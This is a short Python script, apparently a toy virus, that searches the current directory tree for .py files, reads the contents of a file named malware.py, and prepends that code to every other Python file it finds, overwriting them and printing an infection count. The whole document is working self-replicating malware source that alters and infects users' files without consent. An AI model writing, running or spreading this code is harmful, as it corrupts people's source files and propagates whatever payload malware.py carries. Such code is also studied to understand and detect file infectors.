import os
from pathlib import Path


def search(search_dir: str) -> tuple[list, str]:
    py_files = []
    for path in Path(search_dir).rglob('*.py'):
        if path.name == "malware.py":
            with open(path) as f:
                malware_code = f.read()
        else:
            py_files.append(path)
    return py_files, malware_code


def spread(target_list: list, malware_code: str):
    counter = 0
    for target in target_list:
        with open(target) as f:
            content = f.read()

        with open(target, "w") as f:
            f.seek(0, 0)
            f.write(malware_code + '\n' + content)

        counter += 1

        print(f"File {target.name} has the message!")

    print(f"THE MALWARE IS OUT! {counter} FILES HAVE BEEN INFECTED!")


def infect():
    cwd = os.getcwd()

    py_files, malware_code = search(cwd)

    spread(py_files, malware_code)


if __name__ == "__main__":
    infect()
